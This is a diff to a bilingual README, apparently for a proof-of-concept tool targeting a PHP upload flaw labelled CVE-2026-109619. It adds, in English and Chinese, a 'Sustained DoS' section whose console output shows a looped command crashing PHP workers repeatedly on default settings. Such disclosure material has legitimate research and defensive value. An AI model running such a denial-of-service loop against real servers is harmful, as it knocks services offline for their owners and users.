@@ -42,7 +42,23 @@ Step 5: Verify — GET /upload.php...
   Worker crashed! PID 38712 → 31800
 ```
 
-Two commands. Default `memory_limit=128M`, default `post_max_size=8M`. Zero server modifications.
+Sustained DoS — loop to keep crashing workers:
+
+```
+DoS> dos
+[CVE-2026-109619] Sustained DoS (infinite — Ctrl+C to stop)
+  #1: PID 31800 → 17344
+  #2: PID 17344 → 37764
+  #3: PID 37764 → 17360
+  #4: PID 17360 → 7928
+  #5: PID 7928 → 33280
+  ...
+^C
+  5 workers crashed, 0 failed, 5 rounds in 34.4s
+  0.15 crashes/sec
+```
+
+Default `memory_limit=128M`, default `post_max_size=8M`. Zero server modifications.
 
 ### How It Works
 
@@ -124,7 +140,23 @@ Step 5: Verify — GET /upload.php...
   Worker crashed! PID 38712 → 31800
 ```
 
-两条命令。默认 `memory_limit=128M`，默认 `post_max_size=8M`，零服务器修改。
+持续 DoS — 循环击杀 worker：
+
+```
+DoS> dos
+[CVE-2026-109619] Sustained DoS (infinite — Ctrl+C to stop)
+  #1: PID 31800 → 17344
+  #2: PID 17344 → 37764
+  #3: PID 37764 → 17360
+  #4: PID 17360 → 7928
+  #5: PID 7928 → 33280
+  ...
+^C
+  5 workers crashed, 0 failed, 5 rounds in 34.4s
+  0.15 crashes/sec
+```
+
+默认 `memory_limit=128M`，默认 `post_max_size=8M`，零服务器修改。
 
 ### 原理
 
